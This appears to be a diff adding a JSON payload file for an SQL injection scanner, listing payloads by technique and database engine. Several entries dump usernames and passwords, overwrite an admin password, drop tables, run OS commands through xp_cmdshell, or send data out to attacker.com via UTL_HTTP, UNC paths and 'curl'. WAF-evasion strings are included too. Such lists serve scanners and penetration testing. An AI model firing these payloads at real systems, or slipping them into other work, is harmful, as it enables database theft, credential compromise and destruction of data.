@@ -1,0 +1,169 @@
+{
+  "metadata": {
+    "name": "SQL Injection Payloads",
+    "version": "1.0.0",
+    "description": "Comprehensive SQLi payload collection for REVUEX SQLi Scanner GOLD",
+    "author": "REVUEX Team"
+  },
+  "error_based": {
+    "description": "Error-based SQL injection payloads",
+    "mysql": [
+      "'",
+      "\"",
+      "' OR '1'='1",
+      "\" OR \"1\"=\"1",
+      "' OR '1'='1' --",
+      "' OR '1'='1' #",
+      "' OR 1=1--",
+      "') OR ('1'='1",
+      "1' AND '1'='1",
+      "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+      "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
+      "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+      "1' AND EXP(~(SELECT * FROM (SELECT VERSION())a))--",
+      "1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(VERSION())) USING utf8)))--"
+    ],
+    "postgresql": [
+      "' OR '1'='1",
+      "'; SELECT version();--",
+      "' AND 1=CAST((SELECT version()) AS int)--",
+      "' AND 1=CAST(CHR(126)||VERSION()||CHR(126) AS NUMERIC)--",
+      "'||(SELECT version())||'",
+      "1' AND (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--"
+    ],
+    "mssql": [
+      "' OR '1'='1",
+      "'; SELECT @@version;--",
+      "' AND 1=CONVERT(int,@@version)--",
+      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
+      "'; WAITFOR DELAY '0:0:5';--",
+      "'; EXEC xp_cmdshell('whoami');--"
+    ],
+    "oracle": [
+      "' OR '1'='1",
+      "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
+      "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
+      "'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'"
+    ],
+    "sqlite": [
+      "' OR '1'='1",
+      "' AND 1=1--",
+      "' UNION SELECT sqlite_version()--",
+      "' AND 1=CAST(sqlite_version() AS INT)--"
+    ]
+  },
+  "blind_boolean": {
+    "description": "Boolean-based blind SQL injection payloads",
+    "payloads": [
+      "' AND 1=1--",
+      "' AND 1=2--",
+      "' AND 'a'='a",
+      "' AND 'a'='b",
+      "' AND SUBSTRING(@@version,1,1)='5'--",
+      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+      "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
+      "1 AND 1=1",
+      "1 AND 1=2",
+      "1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)='1",
+      "1' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)='1"
+    ]
+  },
+  "blind_time": {
+    "description": "Time-based blind SQL injection payloads",
+    "mysql": [
+      "' AND SLEEP(5)--",
+      "' AND (SELECT SLEEP(5))--",
+      "' AND BENCHMARK(10000000,SHA1('test'))--",
+      "1' AND IF(1=1,SLEEP(5),0)--",
+      "1' AND IF(1=2,SLEEP(5),0)--",
+      "' OR SLEEP(5)#"
+    ],
+    "postgresql": [
+      "'; SELECT pg_sleep(5);--",
+      "' AND (SELECT pg_sleep(5))--",
+      "1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
+      "'||pg_sleep(5)--"
+    ],
+    "mssql": [
+      "'; WAITFOR DELAY '0:0:5';--",
+      "' AND (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3)>0--",
+      "1' IF 1=1 WAITFOR DELAY '0:0:5'--",
+      "1' IF 1=2 WAITFOR DELAY '0:0:5'--"
+    ],
+    "oracle": [
+      "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
+      "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--",
+      "' AND UTL_INADDR.GET_HOST_ADDRESS('sleep5.attacker.com')--"
+    ],
+    "sqlite": [
+      "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--"
+    ]
+  },
+  "union_based": {
+    "description": "UNION-based SQL injection payloads",
+    "payloads": [
+      "' UNION SELECT NULL--",
+      "' UNION SELECT NULL,NULL--",
+      "' UNION SELECT NULL,NULL,NULL--",
+      "' UNION SELECT 1,2,3--",
+      "' UNION SELECT 1,2,3,4,5--",
+      "' UNION ALL SELECT NULL--",
+      "' UNION SELECT @@version--",
+      "' UNION SELECT version()--",
+      "' UNION SELECT user()--",
+      "' UNION SELECT database()--",
+      "' UNION SELECT table_name FROM information_schema.tables--",
+      "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
+      "-1' UNION SELECT 1,2,3--",
+      "1' UNION SELECT 1,CONCAT(username,':',password),3 FROM users--"
+    ]
+  },
+  "stacked_queries": {
+    "description": "Stacked query payloads",
+    "payloads": [
+      "'; SELECT version();--",
+      "'; INSERT INTO logs VALUES('pwned');--",
+      "'; UPDATE users SET password='hacked' WHERE username='admin';--",
+      "'; DROP TABLE test;--",
+      "'; CREATE TABLE pwned(data varchar(100));--"
+    ]
+  },
+  "waf_bypass": {
+    "description": "WAF bypass techniques",
+    "payloads": [
+      "/*!50000SELECT*/ @@version",
+      "/**/UNION/**/SELECT/**/",
+      "UN/**/ION/**/SE/**/LECT",
+      "uNiOn SeLeCt",
+      "UNION%0aSELECT",
+      "UNION%0dSELECT",
+      "UNION%09SELECT",
+      "UNION%23%0aSELECT",
+      "%55NION %53ELECT",
+      "0x554e494f4e2053454c454354",
+      "UNION(SELECT(1),2,3)",
+      "UNION+SELECT+1,2,3",
+      "/?id=1;SELECT+1,2,3",
+      "UNION ALL SELECT 1,2,3#",
+      "' /*!UNION*/ /*!SELECT*/ 1,2,3--"
+    ]
+  },
+  "out_of_band": {
+    "description": "Out-of-band SQL injection payloads (use with collaborator)",
+    "mysql": [
+      "' AND LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a'))--",
+      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+    ],
+    "mssql": [
+      "'; EXEC master..xp_dirtree '\\\\attacker.com\\share';--",
+      "'; EXEC master..xp_fileexist '\\\\attacker.com\\share';--"
+    ],
+    "oracle": [
+      "' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1))--",
+      "' AND DBMS_LDAP.INIT(('attacker.com',80))--"
+    ],
+    "postgresql": [
+      "'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/';--"
+    ]
+  }
+}
